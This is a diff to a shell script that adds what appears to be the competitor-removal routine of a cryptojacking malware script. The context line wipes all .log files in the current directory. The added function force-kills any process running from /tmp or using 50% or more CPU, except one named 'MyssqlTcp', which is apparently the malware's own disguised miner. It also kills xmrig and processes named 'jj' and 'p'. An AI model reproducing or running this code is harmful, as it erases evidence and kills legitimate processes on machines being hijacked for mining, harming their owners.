@@ -16,3 +16,36 @@ then
 fi
  
 ls *.log | xargs -I x -n 1 sh -c "echo > x”
+
+kill_sus_proc()
+{
+    ps axf -o "pid"|while read procid
+    do
+        ls -l /proc/$procid/exe | grep /tmp
+        if [ $? -ne 1 ]
+        then
+            cat /proc/$procid/cmdline| grep -a -E "MyssqlTcp"
+            if [ $? -ne 0 ]
+            then
+                kill -9 $procid
+            else
+                echo "don't kill"
+            fi
+        fi
+    done
+    ps axf -o "pid %cpu" | awk '{if($2>=50.0) print $1}' | while read procid
+    do
+        cat /proc/$procid/cmdline| grep -a -E "MyssqlTcp"
+        if [ $? -ne 0 ]
+        then
+            kill -9 $procid
+        else
+            echo "don't kill"
+        fi
+    done
+}
+
+killall -9 xmrig
+killall -9 jj
+killall -9 p
+kill_sus_proc
